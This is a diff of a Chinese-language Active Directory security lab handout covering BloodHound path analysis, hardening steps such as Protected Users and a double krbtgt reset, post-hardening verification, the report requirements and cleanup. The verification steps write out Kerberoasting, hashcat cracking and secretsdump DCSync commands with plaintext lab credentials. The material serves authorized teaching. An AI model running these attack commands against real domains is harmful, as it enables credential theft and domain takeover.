+### 步骤 10：收集 BloodHound 数据
+
+```bash
+bloodhound-python \
+  -d corp.local \
+  -u zhangsan \
+  -p 'P@ssw0rd123' \
+  -ns 192.168.1.20 \
+  -c All \
+  --zip
 ```
-# 在BloodHound中执行以下预定义查询：
-# 1. Find Shortest Path to Domain Admins → 分析普通用户到域管的最短路径
-# 2. Find All Domain Admins → 列出所有域管理员
-# 3. Find Users with DCSync Rights → 找出有DCSync权限的用户
-# 4. Find Kerberoastable AS-REP Roastable Users → 找出可被Kerberoasting的用户
-# 5. Find Policies where DOMAIN USERS have GenericAll → 找出域用户有完全控制的GPO
-```
 
-> **知识关联**：对应讲义中”BloodHound可视化AD攻击路径分析”——BloodHound基于图数据库分析AD中的攻击路径，可视化展示提权路径。
-> 
+### 步骤 11：导入并分析
+
+在 BloodHound 中优先执行以下查询：
+
+1. `Find Shortest Paths to Domain Admins`
+2. `Find All Domain Admins`
+3. `Find Principals with DCSync Rights`
+4. `Find Kerberoastable Users`
+5. `Shortest Paths from Kerberoastable Users`
+
+分析时重点回答：
+
+- 普通域用户距离域管还差几步？
+- 是哪个服务账户、组委派或 ACL 配置构成了突破口？
+- 若移除该错误授权，攻击路径会如何变化？
+
+如果理解还停留在“图上有一条线”，那说明分析还不够深入。更理想的表达方式是把这条线翻译成一句完整的话，例如：“普通域用户因为拿到了 `sqlsvc`，而 `sqlsvc` 又被错误授予复制权限，所以最终可以 DCSync 到域级哈希。”
 
 ---
 
 ### 阶段五：域安全加固与验证
 
-**步骤12：修复域安全配置**
+这一阶段非常重要。前面做攻击，是为了看清问题；后面做加固，才是这门课真正要落到实处的地方。
 
-在域控上执行：
+### 阶段目标
+
+- 切断前面已经验证过的关键攻击链。
+- 用复测证明“配置改了以后，攻击确实不灵了”。
+- 形成“问题在哪里、为什么危险、怎么修、修完怎么验证”的闭环。
+
+### 步骤 12：实施基础加固
+
+在域控上执行以下操作：
+
+#### 12.1 将高权限账户加入 Protected Users
 
 ```powershell
-# 1. 将高权限账户加入Protected Users组
 Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","itadmin"
-# Protected Users组成员：
-# - 不能使用NTLM认证
-# - 凭据不会被缓存
-# - 必须使用Kerberos智能卡登录（Windows Server 2012 R2+）
-
-# 2. 启用Kerberos AES加密
-# 通过GPO配置：
-# gpedit.msc → 计算机配置 → Windows设置 → 安全设置 → 本地策略 → 安全选项
-#   网络安全: 配置Kerberos允许的加密类型 → 启用，勾选AES-256
-
-# 3. 更改krbtgt密码（防御黄金票据）
-# 创建新密码
-$newKrbtgtPassword = ConvertTo-SecureString "NewKrbtgt@2024!VeryLong" -AsPlainText -Force
-Set-ADAccountPassword -Identity "krbtgt" -NewPassword $newKrbtgtPassword -Reset
-# 注意：需要在域控上操作两次并等待复制，使旧票据失效
-
-# 4. 限制DCSync权限
-# 移除不必要的Replicating Directory Changes权限
-# 仅保留Domain Admins和Enterprise Admins的DCSync权限
-
-# 5. 审核域管变更
-# 在GPO中启用以下审核策略：
-# 审核策略 → 审核目录服务访问 → 成功，失败
-# 审核策略 → 审核帐户管理 → 成功
-
-# 6. 禁用弱密码服务账户，改为使用组托管服务账户（gMSA）
-# 将服务账户密码改为强密码
-Set-ADAccountPassword -Identity "sqlsvc" -Reset
-New-ADAccountPassword -Identity "websvc" -Reset
-
-# 验证
-Get-ADGroupMember -Identity "Protected Users"
-Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName}
 ```
 
-**步骤13：验证加固效果**
+Protected Users 的主要效果：
 
-```
-# 1. 验证Protected Users组生效（示例：该组成员应限制/拒绝NTLM）
-crackmapexec smb 192.168.1.20 -d corp.local -u itadmin -p 'P@ssw0rd123'
+- 禁止使用 NTLM 进行身份验证；
+- 禁止使用 DES/RC4 等弱 Kerberos 加密；
+- 不缓存可重用凭据；
+- 限制某些委派场景。
 
-# 2. 验证Kerberoasting效果（强密码后破解应失败）
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/zhangsan:'P@ssw0rd123' -dc-ip 192.168.1.20 -request -outputfile /tmp/tgs_new.txt
-hashcat -m 13100 /tmp/tgs_new.txt /usr/share/wordlists/rockyou.txt --force
+这里需要注意：Protected Users 不是“万能安全开关”。它适合保护高价值账号，但如果环境里还依赖某些旧协议或旧系统，直接启用可能会带来兼容性问题，因此在生产环境中必须先评估、再逐步推广。
 
-# 3. 验证DCSync权限被限制（移除权限后应失败）
-/usr/share/doc/python3-impacket/examples/secretsdump.py corp.local/zhangsan:'P@ssw0rd123'@192.168.1.20 -just-dc
-```
-
----
-
-## 三、实验报告要求
-
-| 序号 | 记录项 | 说明 |
-| --- | --- | --- |
-| 1 | 域信息收集结果 | 域名、域用户列表、域组列表、密码策略 |
-| 2 | Kerberoasting过程 | TGS票据哈希、破解结果 |
-| 3 | DCSync攻击结果 | 导出的域用户哈希列表（脱敏处理） |
-| 4 | BloodHound分析 | 攻击路径截图、关键发现 |
-| 5 | 加固配置清单 | Protected Users、krbtgt密码、DCSync权限等 |
-
-### 思考题
-
-1. Kerberoasting攻击需要什么前提条件？为什么服务账户通常是攻击目标？
-2. DCSync攻击为什么如此危险？获取krbtgt哈希后如何伪造黄金票据？
-3. Protected Users组提供哪些保护？它有什么使用限制？
-4. 为什么krbtgt密码需要修改两次？仅修改一次有什么风险？
-5. 在域环境中，最小权限原则应如何应用于服务账户？
-
----
-
-## 四、实验清理
+#### 12.2 修复服务账户风险
 
 ```powershell
-# 1. 如果要保留域环境，只删除测试用户和组
+$NewSvcPwd = ConvertTo-SecureString "Str0ng-Service-2026!" -AsPlainText -Force
+Set-ADAccountPassword -Identity "sqlsvc" -NewPassword $NewSvcPwd -Reset
+Set-ADUser -Identity "sqlsvc" -PasswordNeverExpires $false
+```
+
+如课程环境支持，建议进一步改造为：
+
+- 组托管服务账户（gMSA）
+- 最小权限服务账户
+- 专用主机、专用服务、专用口令策略
+
+#### 12.3 修改 `krbtgt` 密码两次
+
+```powershell
+$NewKrbtgtPwd1 = ConvertTo-SecureString "Krbtgt-Reset-2026-01!" -AsPlainText -Force
+Set-ADAccountPassword -Identity "krbtgt" -NewPassword $NewKrbtgtPwd1 -Reset
+
+# 等待域复制完成后，再执行第二次重置
+$NewKrbtgtPwd2 = ConvertTo-SecureString "Krbtgt-Reset-2026-02!" -AsPlainText -Force
+Set-ADAccountPassword -Identity "krbtgt" -NewPassword $NewKrbtgtPwd2 -Reset
+```
+
+> 必须重置两次，才能让基于旧密钥签发的黄金票据完全失效。
+
+#### 12.4 收紧复制权限与审计策略
+
+- 移除非必要账户的目录复制权限；
+- 审核高权限组成员变更；
+- 启用目录服务访问、账户管理、Kerberos 服务票据相关日志；
+- 对服务账户启用最小权限和定期轮换。
+
+### 步骤 13：验证加固效果
+
+#### 13.1 验证 Protected Users
+
+```bash
+crackmapexec smb 192.168.1.20 -d corp.local -u itadmin -p 'Admin@2024!'
+```
+
+预期现象：不再允许以普通 NTLM 方式完成原有认证流程。
+
+#### 13.2 验证 Kerberoasting 收益下降
+
+```bash
+/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+  corp.local/zhangsan:'P@ssw0rd123' \
+  -dc-ip 192.168.1.20 \
+  -request \
+  -outputfile /tmp/tgs_new.txt
+
+hashcat -m 13100 /tmp/tgs_new.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+预期现象：仍可请求服务票据，但由于密码足够强，离线破解在实验时间内应难以成功。
+
+#### 13.3 验证 DCSync 被阻断
+
+```bash
+/usr/share/doc/python3-impacket/examples/secretsdump.py \
+  corp.local/sqlsvc:'Str0ng-Service-2026!'@192.168.1.20 \
+  -dc-ip 192.168.1.20 \
+  -just-dc
+```
+
+预期现象：如果复制权限已被正确移除，命令应失败或返回权限不足。
+
+到这里应形成一个很重要的安全意识：真正有效的加固，不是“看起来配过了”，而是攻击链真的走不通了。
+
+---
+
+## 五、实验报告要求
+
+### 5.1 报告必交内容
+
+写报告时，不要只堆截图。每一部分最好都回答三个问题：做了什么、看到了什么、这说明了什么。
+
+| 序号 | 记录项 | 建议内容 |
+| --- | --- | --- |
+| 1 | 实验环境 | 网络拓扑、主机 IP、域名、账户说明 |
+| 2 | 域信息收集结果 | 用户、组、计算机、密码策略、SPN 列表 |
+| 3 | Kerberoasting 过程 | TGS 哈希获取、离线破解结果、风险分析 |
+| 4 | DCSync 结果 | 关键账户哈希的脱敏截图与文字说明 |
+| 5 | BloodHound 分析 | 最短路径截图、关键错误授权点 |
+| 6 | 加固与复测 | 改动项、命令、复测结果、结论 |
+
+### 5.2 思考题
+
+1. Kerberoasting 为什么通常只需要普通域用户权限？
+2. 为什么“弱口令服务账户 + 高权限/错误授权”会构成高风险组合？
+3. DCSync 与直接登录域控导出哈希相比，有什么隐蔽性和危害差异？
+4. `krbtgt` 密码为什么必须修改两次？
+5. 如果你是域管理员，最优先修复的 3 个问题会是什么？为什么？
+
+这几道题不是为了背答案，而是为了训练把“攻击现象”翻译成“安全原理”和“治理思路”。
+
+---
+
+## 六、实验清理
+
+### 6.1 删除测试对象
+
+```powershell
 Remove-ADUser -Identity "zhangsan" -Confirm:$false
-Remove-ADUser -Identity "lisi" -Confirm:$false
-Remove-ADUser -Identity "wangwu" -Confirm:$false
+Remove-ADUser -Identity "itadmin" -Confirm:$false
 Remove-ADUser -Identity "sqlsvc" -Confirm:$false
-Remove-ADUser -Identity "websvc" -Confirm:$false
-Remove-ADGroup -Identity "IT部门" -Confirm:$false
-Remove-ADGroup -Identity "销售部门" -Confirm:$false
-Remove-ADGroup -Identity "财务部门" -Confirm:$false
+```
 
-# 2. 如果要完全清除域环境，恢复快照
+### 6.2 恢复策略与快照
 
-# 3. 启用防火墙
+- 如果本实验修改了 `krbtgt`、Protected Users、ACL 或 GPO，请恢复到实验前快照；
+- 若需保留域环境，应重新生成一套新的实验账户与随机密码；
+- 清理导出的哈希、票据、截图与临时文件。
+
+最后再强调一次：实验做完，环境一定要清。域实验最大的风险，不是在实验过程中跑了什么命令，而是在结束后把高风险对象、票据和弱口令留在环境里。
+
+### 6.3 恢复主机保护配置
+
+```powershell
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
 ```
 
-> **免责声明**：本实验仅用于授权的安全教学环境。对任何未授权的Active Directory域环境进行渗透测试属于严重违法行为。DCSync攻击会导出域中所有用户的密码哈希，操作后果严重，请确保仅在隔离的实验环境中执行。
->
+> **免责声明**：本讲义仅用于授权的安全教学与实验环境。对任何未授权的 Active Directory 域环境实施枚举、票据攻击、复制攻击或权限提升，均可能构成严重违法违规行为。
